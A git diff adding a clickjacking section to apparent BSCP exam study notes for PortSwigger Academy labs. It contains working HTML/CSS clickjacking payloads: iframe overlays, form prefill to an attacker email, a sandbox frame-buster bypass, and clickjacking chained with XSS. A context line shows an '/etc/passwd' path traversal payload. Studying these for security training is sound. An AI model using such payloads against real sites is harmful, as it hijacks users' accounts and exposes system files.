@@ -1,4 +1,4 @@
-# BSCP---Notes
+![image](https://github.com/user-attachments/assets/064cbc2a-1c16-42f3-b511-e7dda66012ac)# BSCP---Notes
 Notes and Additional Payloads for Web Application Vulnerabilities Topics covered in PortSwigger Academy
 
 *This is just another Notes Repo for the BSCP Exam. I hope you will find it helpful. For some topics, I have additional payloads and notes that go beyond the BSCP Exam, but I decided to include them if someone is interested.*
@@ -206,5 +206,123 @@ OR
 **6)** **Null-Byte**: If the application is expecting a specific extension such as .png we can bypass that by passing the payload which will include a null byte if the app allows that ``` ../../../etc/passwd%00.jpg ``` ---> everything after null byte is ignored but it's sufficient for us to bypass the check where the app is looking in this case for _.jpg_ extension
 
 
+### Clickjacking
+Clickjacking is a vulnerability where the user is tricked into clicking the content of an invisible website that is hidden on the **decoy website**. An example would be if the user clicks on the website to win the prize (decoy site), but instead, user is clicking the invisible content that is making a payment to an attacker.
 
+## Exploitation
 
+**1)** Basic clickjacking with CSRF protection will require us to induce div & iframe elements with some CSS, as for an example:
+```
+<style>
+    iframe {
+	position:relative;
+	width:500px;
+	height: 700px;
+	opacity: 0.1;
+	z-index: 2;
+    }
+    div {
+	position:absolute;
+	top:500px;
+	left:60px;
+	z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://<YOUR_LAB_ID>.web-security-academy.net/my-account"></iframe>
+
+```
+With this payload, we are tricking the victim into performing unintended action by using <iframe/> tag to target website that lacks Clickjacking Protection. Make sure to adjust CSS properly, mainly the CSS of the div element as that is what the victim will be clicking.
+
+**2)** If we are dealing with a form that needs to be filled before submission (such as changing an email address) and app allows prepopulating the form using GET parameter from URL prior to submission we can take advantage of that by upgrading our payload from **1)** to
+
+```
+<style>
+    iframe {
+	position:relative;
+	width:500px;
+	height: 700px;
+	opacity: 0.1;
+	z-index: 2;
+    }
+    div {
+	position:absolute;
+	top:500px;
+	left:60px;
+	z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://<YOUR_LAB_ID>.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
+```
+Now when the user navigates to our malicious website and performers click action, the form on the target website will be submitted thanks to the fact that the target website allows form pre-population; that is why we added ?email parameter in the iframe's src.
+
+**3)** Some websites will have protection against clickjacking by utilizing frame-busting scripts, which will prevent us from using iframe like in **1) & 2)** but we can bypass this by adding a **sandbox** attribute to our iframe HTML element!
+```
+<style>
+    iframe {
+	position:relative;
+	width:500px;
+	height: 700px;
+	opacity: 0.1;
+	z-index: 2;
+    }
+    div {
+	position:absolute;
+	top:500px;
+	left:60px;
+	z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe id="victim_website" src="https://<YOUR_LAB_ID>.web-security-academy.net/my-account" sandbox="allow-forms"></iframe>
+```
+**4)** Clickjacking is very powerful vulnerability that can be combined with other vulnerabilities such as Cross-Site Scripting in this lab's scenario. Let's assume that we found a parameter that is vulnerable to XSS again in form submission and that the web app allows form pre-population which means that we can include XSS payload in the iframe's src to the target website. In this instance **?name** parameter is vulnerable to DOM-XSS, so we can build the Clickjacking Payload with XSS Payload within it:
+
+```
+<style>
+    iframe {
+	position:relative;
+	width:500px;
+	height: 700px;
+	opacity: 0.1;
+	z-index: 2;
+    }
+    div {
+	position:absolute;
+	top:500px;
+	left:60px;
+	z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe id="victim_website" src="https://<YOUR_LAB_ID>.web-security-academy.net/feedback?name=%3Cimg%20src=0%20onerror=print(1)%3E&email=test123@gmail.com&subject=test&message=test"></iframe>
+```
+**5)** Sometimes in order to trick the victim we will have to conduct multiple steps (multiple clickjacking), we can do so by simply upgrading our payload from **1)** with another div element and adding CSS for it accordingly.
+```
+<style>
+    iframe {
+	position:relative;
+	width:500px;
+	height: 700px;
+	opacity: 0.1;
+	z-index: 2;
+    }
+    .div-1 {
+	position:absolute;
+	top:500px;
+	left:60px;
+	z-index: 1;
+    }
+   .div-2{
+       position:absolute;
+       top:290px;
+       left:190px;
+       z-index:1;
+}
+</style>
+<div class="div-1">Click me first</div>
+<div class="div-2">Click me next</div>
+<iframe src="https://<YOUR_LAB_ID>.web-security-academy.net/my-account"></iframe>
+```
+In this case we are ticking the victim 2 times so that is why we have 2 div elements, with 2 different classes depending on the CSS adjustment needs.
